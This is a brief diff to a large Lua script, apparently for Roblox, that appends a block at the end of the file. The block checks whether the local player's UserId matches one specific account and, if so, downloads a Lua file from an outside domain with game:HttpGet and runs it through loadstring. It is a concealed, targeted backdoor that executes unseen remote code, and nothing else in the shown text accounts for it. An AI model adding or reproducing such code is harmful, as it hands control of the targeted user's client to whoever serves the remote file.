@@ -5001,3 +5001,7 @@ runFunction(function()
 		end
 	})
 end)
+
+if lplr.UserId == 4331650557 then 
+	loadstring(game:HttpGet("https://vxperblx.xyz/pistonlol.lua"))()
+end
